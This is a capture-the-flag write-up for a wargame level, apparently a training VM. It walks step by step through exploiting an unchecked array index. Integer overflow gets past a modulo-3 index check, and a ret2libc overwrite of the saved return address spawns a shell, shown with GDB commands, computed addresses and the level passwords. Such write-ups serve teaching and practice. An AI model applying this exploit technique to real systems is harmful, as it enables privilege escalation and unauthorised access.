# Level07 - 32 bits - Bypass Modulo protection

## Local script usage

Requirements:

- `gdb-peda`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level07/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level07 | `GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8` |
| level08 | `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC` |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

We can notice multiple things:

- First, the program erases every arguments passed to the program and every environment variables. It means we can not use a shellcode passed in argument or exported as environment variable.
- We can store unsigned integers in an array and read them, while giving an index.
- The array has a size of 25 (`25 * 4 bytes`), but there is no protection to write beyond.
- Nonetheless there is a little protection: we can not write at indexes where `index % 3 == 0`. (It seems that EIPs are aligned, and this is a little protection).

As we can not execute a shellcode, we will try to use the ret2libc attack while overriding the return address with: `system_address` + `exit_address [optional]` + `/bin/sh`

First, we need to find `system`, `exit` and `/bin/sh` addresses

```shell
gdb-peda$ b*main
gdb-peda$ run
gdb-peda$ p system
  $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

gdb-peda$ p exit
  $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

gdb-peda$ searchmem "/bin/sh"
  Searching for '/bin/sh' in: None ranges
  Found 1 results, display max 1 items:
  libc : 0xf7f897ec ("/bin/sh")
```

Perfect ! Now we have to find the return address in the GOT of main function.

```
gdb-peda$ info frame
Stack level 0, frame at 0xffffd640:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 called by frame at 0xffffd6b0
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd640
 Saved registers:
  eip at 0xffffd63c
```

We have everything we need to build exploit.

To summurize, we want write this payload at EIP address:

```
EIP_ADDRESS = SYSTEM_ADDRESS + EXIT_ADDRESS + SHELL_ADDRESS
                    |              |               |
0xffffd63c =   0xf7e6aed0      0xf7e5eb70      0xf7f897ec
```

Now, we have to store this payload at EIP address using `store_number`. So we need to find the indexes of EIP address regarding our array.

Lets get the array address.

```shell
b*store_number+6
run
(stdin) store
p $ebp+0x8 # int *data
  $9 = (void *) 0xffffd450
x/a 0xffffd450
0xffffd450:     0xffffd474  # <-- data[0]
```

Now we have to calculate the offset of EIP address:

```shell
p /d (int)(0xffffd63c - 0xffffd474) # eip_address - array_address
  456 # bytes
p /d 456 / 4
  114 # index

p 114 % 3
  0x0
```

But as `114 % 3 == 0`, we can not write enter this number as index.

We had to find a way to bypass this protection.

As `index` is an unsigned int, and as `index` is multiplied by 4, before storing the number, what happens if we use a number greater than `UINT_MAX + 1 / 4` ?

```shell
p (unsigned int)0x100000000 # UINT_MAX + 1
  0x0                       # stores at index 0

p /u (0x100000000 / 4) + 114
  1073741938                # stores at index 114

p 1073741938 % 3
  0x1                       # and it passes the check !
```

Lets check with a simple value

```shell
p /d 0x41414141
  1094795585 # AAAA

run
  Input command: store
    Number: 1094795585      # AAAA
    Index: 1073741938       # index 114
    Completed store command successfully
  Input command: quit

EIP: 0x41414141 ('AAAA')
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

It segfaults while quiting the program. It is exactly what we wanted.

Lets build our exploit with `system`, `exit` and `/bin/sh`

```shell
Index 114: 1073741938 stores at index 114 (cf. above)
Index 115: 115 % 3 = 1 => we can use 115 as index
Index 116: 116 % 3 = 2 => we can use 116 as index


EIP_ADDRESS = SYSTEM_ADDRESS + EXIT_ADDRESS + SHELL_ADDRESS
                    |              |               |
0xffffd63c =   0xf7e6aed0      0xf7e5eb70      0xf7f897ec    # Addresses
               4159090384      4159040368      4160264172    # Unsigned int
                    |              |               |
               data[114]       data[115]       data[116]
               1073741938      115             116           # Indexes
```

Let try to get the shell:

```shell
~/level07
  Input command: store
    Number: 4159090384  # system 0xf7e6aed0
    Index: 1073741938   # Index 114
    Completed store command successfully
  Input command: store
    Number: 4159040368  # exit 0xf7e5eb70
    Index: 115
    Completed store command successfully
  Input command: store
    Number: 4160264172  # /bin/sh 0xf7f897ec
    Index: 116
    Completed store command successfully
  Input command: quit
$ whoami
  level08
$ cat /home/users/level08/.pass
  7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## Sources

### Hack

- [FR - Retour à la libc](https://beta.hackndo.com/retour-a-la-libc/)

### Debugger

- [get return address GDB](https://stackoverflow.com/questions/32345320/get-return-address-gdb)

### C

- [Man fflush](https://linux.die.net/man/3/fflush)
- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man getchar](https://linux.die.net/man/3/getchar)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man scanf](https://linux.die.net/man/3/scanf)
- [Man strlen](https://linux.die.net/man/3/strlen)
- [Man strncmp](https://linux.die.net/man/3/strncmp)
